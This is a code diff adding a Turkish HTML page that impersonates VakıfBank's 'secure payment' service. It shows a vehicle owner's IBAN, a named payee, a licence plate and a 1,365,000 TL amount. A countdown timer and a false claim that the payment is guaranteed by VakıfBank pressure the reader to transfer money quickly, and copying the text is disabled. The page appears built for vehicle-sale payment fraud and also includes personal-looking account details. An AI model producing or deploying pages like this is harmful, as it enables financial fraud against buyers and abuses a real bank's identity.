@@ -1,0 +1,109 @@
+
+<!DOCTYPE html>
+
+<html lang="tr">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>VakıfBank Güvenli Ödeme</title>
+<style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #f7b500;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #231f20;
+    }
+    .container {
+      background: transparent;
+      padding: 2rem;
+      border-radius: 10px;
+      width: 95%;
+      max-width: 420px;
+      pointer-events: none;
+      user-select: none;
+    }
+    .container img {
+      max-width: 240px;
+      display: block;
+      margin: 0 auto 1.5rem;
+    }
+    .title {
+      text-align: center;
+      font-size: 1.4rem;
+      font-weight: bold;
+      margin-bottom: 1rem;
+    }
+    .info {
+      margin-bottom: 1rem;
+    }
+    .label {
+      font-weight: bold;
+      font-size: 1rem;
+      margin-bottom: 0.3rem;
+      color: #231f20;
+    }
+    .value {
+      background-color: #f7f7f7;
+      padding: 0.8rem;
+      border-radius: 5px;
+      font-size: 1rem;
+      color: #231f20;
+    }
+    .countdown {
+      text-align: center;
+      font-size: 1.4rem; color: #f00;
+      font-weight: bold;
+      margin-bottom: 1rem;
+      color: #231f20;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 1.5rem;
+        max-width: 100%;
+      }
+    }
+    </style>
+</head>
+<body style=" background-image: repeating-linear-gradient(rgba(0,0,0,0.03) 0 0), url('data:image/svg+xml;utf8,&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot; width=&quot;600&quot; height=&quot;400&quot;&gt;&lt;text x=&quot;50%&quot; y=&quot;50%&quot; dominant-baseline=&quot;middle&quot; text-anchor=&quot;middle&quot; font-size=&quot;80&quot; font-family=&quot;Arial&quot; fill=&quot;rgba(0,0,0,0.06)&quot;&gt;VAKIFBANK&lt;/text&gt;&lt;/svg&gt;'); background-size: cover; background-position: center center; background-repeat: no-repeat;">
+<div class="container">
+<img alt="VakıfBank" src="vakifbank-logo.jpg"/>
+<div class="countdown" id="countdown">Kalan Süre: 03:00</div>
+<div class="title">Araç Sahibi IBAN Bilgileri</div>
+<div class="info"><div class="label">IBAN</div><div class="value">TR12 0001 5001 5800 7302 7279 01</div></div>
+<div class="info"><div class="label">Tutar</div><div class="value">1.365.000 TL</div></div>
+<div class="info"><div class="label">Ad Soyad</div><div class="value">Mevlüt Keser</div></div>
+<div class="info">
+<div class="label">Plaka</div>
+<div class="value">07 BKL 585</div>
+</div>
+
+
+<div class="info" style="margin-top:2rem;">
+<div class="value" style="text-align:center; font-size: 1rem; font-weight: bold; background-color: #fff; border-radius: 5px; padding: 1rem;">
+    Bu ödeme işlemi VakıfBank güvencesi altında gerçekleştirilmekte olup, belirtilen süre içinde tamamlanması gerekmektedir.
+  </div>
+</div>
+</div>
+<script>
+    let duration = 180;
+    const countdownEl = document.getElementById("countdown");
+    const interval = setInterval(() => {
+      const minutes = Math.floor(duration / 60);
+      const seconds = duration % 60;
+      countdownEl.textContent = "Kalan Süre: " +
+        String(minutes).padStart(2, '0') + ":" +
+        String(seconds).padStart(2, '0');
+      if (duration <= 0) {
+        clearInterval(interval);
+        countdownEl.textContent = "Süre doldu";
+      }
+      duration--;
+    }, 1000);
+  </script>
+<div style="position: fixed; bottom: 10px; left: 10px; font-size: 1.1rem; font-weight: bold; color: #231f20; background-color: #f7b500; padding: 0.4rem 0.8rem; border-radius: 6px;">Tarih: 14.07.2025</div></body>
+</html>
